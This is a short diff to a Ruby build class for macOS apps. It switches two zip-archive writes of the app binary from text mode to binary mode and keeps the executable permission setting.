@@ -137,7 +137,7 @@ class BuildOSX < Build
       trace :debug, "Build: pack: repacking the app with [#{@appname}]"
 
       Zip::ZipFile.open(path('input')) do |z|
-        z.file.open(@appname, 'w') {|f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
+        z.file.open(@appname, 'wb') {|f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
         z.file.chmod(0755, @appname)
       end
 
@@ -150,7 +150,7 @@ class BuildOSX < Build
     end
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      z.file.open(@appname, "w") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
+      z.file.open(@appname, "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
       z.file.chmod(0755, @appname)
     end
 
